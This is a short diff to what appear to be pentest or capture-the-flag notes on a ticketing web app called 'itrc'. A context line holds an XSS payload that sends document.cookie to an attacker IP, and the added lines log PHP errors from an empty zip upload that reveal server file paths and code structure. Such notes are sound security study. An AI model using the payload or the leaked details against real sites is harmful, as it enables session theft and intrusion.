@@ -40,3 +40,13 @@ test
 
 by visiting the page i saw that some may use a XSS payload:
 <script>document.location='http:/<IP>>/?='+document.cookie;</script>
+
+when attempting to load empty file got:
+
+Deprecated: ZipArchive::open(): Using empty file as ZipArchive is deprecated in /var/www/itrc/savefile.inc.php on line 38
+
+Warning: hash_file(/tmp/php6y9Gq4): Failed to open stream: No such file or directory in /var/www/itrc/savefile.inc.php on line 48
+
+Fatal error: Uncaught UnexpectedValueException: RecursiveDirectoryIterator::__construct(/tmp/temp_zipaJFwzJ): Failed to open directory: No such file or directory in /var/www/itrc/savefile.inc.php:52 Stack trace: #0 /var/www/itrc/savefile.inc.php(52): RecursiveDirectoryIterator->__construct('/tmp/temp_zipaJ...') #1 /var/www/itrc/api/create_ticket.php(8): process_file(Array) #2 {main} thrown in /var/www/itrc/savefile.inc.php on line 52
+
+
